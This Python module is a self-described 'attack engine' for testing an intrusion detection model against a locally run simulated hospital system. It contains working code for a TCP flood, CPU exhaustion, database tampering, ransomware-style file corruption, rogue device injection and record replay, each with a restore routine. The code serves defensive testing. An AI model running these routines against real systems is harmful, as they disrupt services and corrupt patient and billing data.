"""
Real Attack Engine — genuine system attacks against the local hospital system.
All attacks target localhost and are fully reversible via stop/restore functions.
Purpose: IDS model validation — attacks cause actual system disruption.
"""
from __future__ import annotations

import json
import shutil
import sqlite3
import socket
import threading
import time
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

HOSPITAL_PORT   = 8502
HOSPITAL_OUT    = Path(__file__).resolve().parent.parent / "hospital_workflow_system" / "outputs"
DB_PATH         = str(HOSPITAL_OUT / "hospital.db")

# Track running attack state
_active: dict[str, Any] = {}


def _safe_db_backup(src: str, dst: str) -> None:
    """
    Copy a live SQLite database safely using the sqlite3 online-backup API.
    Unlike shutil.copy2, this acquires a shared lock and waits for any in-
    progress write to finish before copying — guaranteeing a consistent
    snapshot even when Streamlit fragments are writing every second.
    """
    src_conn = sqlite3.connect(src)
    dst_conn = sqlite3.connect(dst)
    src_conn.backup(dst_conn)
    dst_conn.close()
    src_conn.close()


def _safe_db_restore(src: str, dst: str) -> None:
    """Restore a DB backup into dst using the safe online-backup API."""
    _safe_db_backup(src, dst)


# ── Utility ───────────────────────────────────────────────────────────────────

def active_attacks() -> list[str]:
    return list(_active.keys())


def stop_all() -> dict:
    results = {}
    for key in list(_active.keys()):
        if key == "dos":
            stop_dos(); results["dos"] = "stopped"
        elif key == "cpu":
            stop_cpu(); results["cpu"] = "stopped"
        elif key == "tamper":
            results["tamper"] = stop_tamper()
        elif key == "ransomware":
            results["ransomware"] = stop_ransomware()
        elif key == "spoof":
            results["spoof"] = stop_spoof()
        elif key == "replay":
            stop_replay(); results["replay"] = "stopped"
    return results


# ── 1. DoS — TCP connection flood against port 8502 ──────────────────────────

def launch_dos(threads: int = 50, duration_sec: int = 60) -> dict:
    """
    Opens rapid TCP connections to localhost:8502 and sends HTTP request bursts.
    Effect on hospital dashboard: pages fail to load, timeouts, 'Connection reset'.
    """
    stop_evt = threading.Event()
    _active["dos"] = stop_evt
    counters: dict[str, int] = {"sent": 0, "errors": 0}
    lock = threading.Lock()

    def worker():
        while not stop_evt.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.2)
                s.connect(("localhost", HOSPITAL_PORT))
                # Send multiple HTTP requests per connection to exhaust server threads
                payload = (
                    b"GET / HTTP/1.1\r\nHost: localhost\r\nConnection: keep-alive\r\n\r\n"
                ) * 5
                s.sendall(payload)
                with lock:
                    counters["sent"] += 1
                time.sleep(0.002)
                s.close()
            except Exception:
                with lock:
                    counters["errors"] += 1

    workers = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
    for w in workers:
        w.start()

    threading.Timer(duration_sec, stop_evt.set).start()

    return {
        "attack": "real_dos",
        "threads": threads,
        "target": f"localhost:{HOSPITAL_PORT}",
        "duration_sec": duration_sec,
        "counters": counters,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }


def stop_dos() -> None:
    ev = _active.pop("dos", None)
    if ev:
        ev.set()


# ── 2. CPU Stress — ransomware resource exhaustion ───────────────────────────

def launch_cpu_stress(cores: int = 4, duration_sec: int = 60) -> dict:
    """
    Spawns CPU-intensive threads to pin system CPU at 90-100%.
    Effect: hospital dashboard updates freeze, Streamlit re-renders stall,
    entire system becomes sluggish, IDS model inference slows.
    """
    stop_evt = threading.Event()
    _active["cpu"] = stop_evt

    def busy(stop: threading.Event) -> None:
        while not stop.is_set():
            # CPU-intensive busy loop
            _ = sum(i * i for i in range(100_000))

    workers = [threading.Thread(target=busy, args=(stop_evt,), daemon=True) for _ in range(cores)]
    for w in workers:
        w.start()

    threading.Timer(duration_sec, stop_evt.set).start()

    return {
        "attack": "real_cpu_stress",
        "cores_stressed": cores,
        "duration_sec": duration_sec,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }


def stop_cpu() -> None:
    ev = _active.pop("cpu", None)
    if ev:
        ev.set()


# ── 3. Data Tamper — direct SQLite database corruption ───────────────────────

def launch_tamper() -> dict:
    """
    Directly writes to hospital.db:
    - All IoT devices → offline / firmware CORRUPTED
    - 1-in-3 patients → status COMPROMISED
    - All billing entries → VOIDED
    - All beds → status contaminated
    Effect: hospital dashboard pages show corrupted live data immediately.
    """
    db = DB_PATH
    if not Path(db).exists():
        return {"error": "hospital.db not found — run hospital dashboard first"}

    bak = db + ".tamper_bak"
    _safe_db_backup(db, bak)
    _active["tamper"] = bak

    stats: dict[str, int] = {}
    try:
        conn = sqlite3.connect(db)
        stats["iot_offline"]         = conn.execute("UPDATE iot_devices SET status='offline', firmware_version='CORRUPTED'").rowcount
        stats["patients_compromised"] = conn.execute("UPDATE patients SET status='COMPROMISED' WHERE (CAST(SUBSTR(patient_id,4) AS INTEGER) % 3) = 0").rowcount
        stats["billing_voided"]      = conn.execute("UPDATE billing_entries SET payment_status='VOIDED', amount_inr=0").rowcount
        stats["beds_contaminated"]   = conn.execute("UPDATE beds SET status='contaminated'").rowcount
        stats["triage_critical"]     = conn.execute("UPDATE triage_queue SET triage_level=1 WHERE status='waiting'").rowcount
        conn.commit()
        conn.close()
    except Exception as exc:
        return {"error": str(exc), "backup": bak}

    return {
        "attack": "real_db_tamper",
        "backup": bak,
        "changes": stats,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }


def stop_tamper() -> dict:
    bak = _active.pop("tamper", None) or (DB_PATH + ".tamper_bak")
    if Path(bak).exists():
        _safe_db_restore(bak, DB_PATH)
        Path(bak).unlink(missing_ok=True)
        return {"restored": True}
    return {"restored": False, "error": "No backup found"}


# ── 4. Ransomware — corrupt output files so dashboard cannot read them ────────

def launch_ransomware() -> dict:
    """
    Overwrites CSV/JSON files in hospital outputs with corrupted content.
    Effect: hospital dashboard throws pandas read errors, charts show no data,
    KPI sections fail to load — visually identical to a ransomware incident.
    """
    out = HOSPITAL_OUT
    if not out.exists():
        return {"error": "outputs directory not found"}

    bak = out.parent / "outputs_ransomware_backup"
    if bak.exists():
        shutil.rmtree(bak)
    shutil.copytree(str(out), str(bak))
    _active["ransomware"] = str(bak)

    locked: list[str] = []

    # Corrupt all CSVs — keep header, replace data with ENCRYPTED placeholders
    for csv_file in out.glob("*.csv"):
        try:
            lines = csv_file.read_text(encoding="utf-8", errors="replace").splitlines()
            if not lines:
                continue
            header = lines[0]
            n_cols = len(header.split(","))
            encrypted_row = ",".join(["ENCRYPTED"] * n_cols)
            corrupted = header + "\n" + "\n".join([encrypted_row] * min(200, len(lines) - 1))
            csv_file.write_text(corrupted, encoding="utf-8")
            locked.append(csv_file.name)
        except Exception:
            pass

    # Overwrite KPI report JSON so dashboard shows ransom message
    for jf in out.glob("*.json"):
        try:
            jf.write_text(json.dumps({
                "RANSOMWARE": "ACTIVE",
                "STATUS": "ALL_FILES_ENCRYPTED",
                "FILES_LOCKED": len(locked),
                "MESSAGE": "HOSPITAL DATA ENCRYPTED — CONTACT ATTACKER FOR KEY",
                "RECOVERY": "RESTORE FROM CLEAN BACKUP",
            }, indent=2), encoding="utf-8")
        except Exception:
            pass

    return {
        "attack": "real_ransomware",
        "backup_dir": str(bak),
        "files_corrupted": locked,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }


def stop_ransomware() -> dict:
    bak_str = _active.pop("ransomware", None) or str(HOSPITAL_OUT.parent / "outputs_ransomware_backup")
    bak = Path(bak_str)
    if not bak.exists():
        return {"restored": False, "error": "No backup directory found"}

    out = HOSPITAL_OUT
    out.mkdir(parents=True, exist_ok=True)

    # Restore only CSV and JSON files — never the database.
    # The DB backup was snapshotted while Streamlit was actively writing
    # (live vitals fragment), so that copy is mid-write corrupted.
    # Instead we always rebuild the DB fresh via hospital_db.
    restored_files: list[str] = []
    for src in bak.iterdir():
        if src.suffix in (".csv", ".json"):
            shutil.copy2(str(src), str(out / src.name))
            restored_files.append(src.name)

    shutil.rmtree(str(bak))

    # Delete the DB (may be malformed), then fully rebuild it so MediCore
    # works immediately after STOP without needing a manual page reload.
    db = Path(DB_PATH)
    db.unlink(missing_ok=True)
    try:
        import sys as _sys
        hospital_root = str(Path(__file__).resolve().parent.parent / "hospital_workflow_system")
        if hospital_root not in _sys.path:
            _sys.path.insert(0, hospital_root)
        from hospital_db import init_db, seed_all
        from workflow_system import run_system
        from config import SystemConfig
        init_db(str(out))
        seed_all(DB_PATH)
        run_system(output_dir=str(out), cfg=SystemConfig())
        db_note = "DB fully rebuilt — MediCore restored immediately"
    except Exception as _exc:
        db_note = f"DB deleted — MediCore will regenerate on reload ({_exc})"

    return {"restored": True, "files": restored_files, "db_note": db_note}


# ── 5. Device Spoof — inject rogue devices into live database ─────────────────

def launch_spoof() -> dict:
    """
    Inserts 15 fake rogue IoMT devices directly into hospital.db.
    Effect: IoMT Devices page shows unknown/rogue devices (ROGUE001–ROGUE015)
    with critical severity and unknown firmware, triggering security alerts.
    """
    db = DB_PATH
    if not Path(db).exists():
        return {"error": "hospital.db not found"}

    bak = db + ".spoof_bak"
    _safe_db_backup(db, bak)
    _active["spoof"] = bak

    import random
    rng = random.Random(77)
    dtypes   = ["ventilator", "wearable_monitor", "infusion_pump", "bedside_sensor", "imaging_gateway"]
    depts    = ["Emergency", "ICU", "Cardiology", "Ward", "Radiology"]
    injected = []

    conn = sqlite3.connect(db)
    for i in range(1, 16):
        rid   = f"ROGUE{i:03d}"
        dtype = rng.choice(dtypes)
        dept  = rng.choice(depts)
        ip    = f"10.0.99.{rng.randint(1, 254)}"
        try:
            conn.execute(
                """INSERT OR REPLACE INTO iot_devices
                   (device_id, device_type, department, criticality, ip_address,
                    firmware_version, status, last_seen)
                   VALUES (?,?,?,?,?,?,?,?)""",
                (rid, dtype, dept, "critical", ip,
                 "UNKNOWN_ROGUE_v0.0", "online",
                 datetime.now(timezone.utc).isoformat()),
            )
            injected.append({"id": rid, "type": dtype, "dept": dept, "ip": ip})
        except Exception:
            pass
    conn.commit()
    conn.close()

    return {
        "attack": "real_device_spoof",
        "rogue_devices_injected": len(injected),
        "devices": injected,
        "backup": bak,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }


def stop_spoof() -> dict:
    bak = _active.pop("spoof", None) or (DB_PATH + ".spoof_bak")
    if Path(bak).exists():
        _safe_db_restore(bak, DB_PATH)
        Path(bak).unlink(missing_ok=True)
        return {"restored": True}
    # Fallback: delete rogue entries
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM iot_devices WHERE device_id LIKE 'ROGUE%'")
        conn.commit()
        conn.close()
        return {"restored": True, "method": "rogue_devices_deleted"}
    except Exception as exc:
        return {"restored": False, "error": str(exc)}


# ── 6. Replay — duplicate recent DB events rapidly ───────────────────────────

def launch_replay(duration_sec: int = 60) -> dict:
    """
    Continuously duplicates recent hospital appointments, lab orders, and triage
    entries in the database, creating a storm of replayed/stale records.
    Effect: patient-facing pages show duplicated queue entries, counts balloon.
    """
    db = DB_PATH
    if not Path(db).exists():
        return {"error": "hospital.db not found"}

    bak = db + ".replay_bak"
    _safe_db_backup(db, bak)

    stop_evt = threading.Event()
    _active["replay"] = (stop_evt, bak)
    counter = {"replayed": 0}

    def _replay_loop():
        import random
        rng = random.Random(55)
        while not stop_evt.is_set():
            try:
                conn = sqlite3.connect(db)
                # Duplicate a random recent triage entry
                rows = conn.execute(
                    "SELECT patient_id, arrival_time, triage_level, chief_complaint FROM triage_queue LIMIT 5"
                ).fetchall()
                if rows:
                    r = rng.choice(rows)
                    conn.execute(
                        "INSERT INTO triage_queue (patient_id, arrival_time, triage_level, chief_complaint, status) VALUES (?,?,?,?,'waiting')",
                        (r[0], datetime.now(timezone.utc).isoformat(), r[2], r[3] + " [REPLAY]"),
                    )
                    counter["replayed"] += 1
                conn.commit()
                conn.close()
            except Exception:
                pass
            time.sleep(1.5)

    threading.Thread(target=_replay_loop, daemon=True).start()
    threading.Timer(duration_sec, stop_evt.set).start()

    return {
        "attack": "real_replay",
        "duration_sec": duration_sec,
        "counter": counter,
        "backup": bak,
        "started_at": datetime.now(timezone.utc).isoformat(),
    }


def stop_replay() -> dict:
    val = _active.pop("replay", None)
    if not val:
        bak = DB_PATH + ".replay_bak"
    else:
        stop_evt, bak = val
        stop_evt.set()

    if Path(bak).exists():
        _safe_db_restore(bak, DB_PATH)
        Path(bak).unlink(missing_ok=True)
        return {"restored": True}
    # Fallback: delete replayed rows
    try:
        conn = sqlite3.connect(DB_PATH)
        conn.execute("DELETE FROM triage_queue WHERE chief_complaint LIKE '%[REPLAY]%'")
        conn.commit()
        conn.close()
        return {"restored": True, "method": "replay_rows_deleted"}
    except Exception as exc:
        return {"restored": False, "error": str(exc)}
